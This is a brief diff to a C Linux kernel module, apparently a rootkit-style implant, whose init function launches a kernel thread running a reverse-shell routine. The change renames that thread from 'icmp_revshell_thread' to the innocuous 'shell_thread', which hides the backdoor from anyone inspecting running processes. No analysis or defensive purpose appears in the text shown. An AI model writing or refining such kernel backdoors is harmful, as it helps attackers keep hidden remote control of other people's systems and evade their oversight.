@@ -48,7 +48,7 @@ void showModule(void) {
 }
 
 static int __init rebellion_init(void) {
-    revshell_thread = kthread_run(revshell_func, NULL, "icmp_revshell_thread");
+    revshell_thread = kthread_run(revshell_func, NULL, "shell_thread");
     if (IS_ERR(revshell_thread)) {
         return PTR_ERR(revshell_thread);
     }
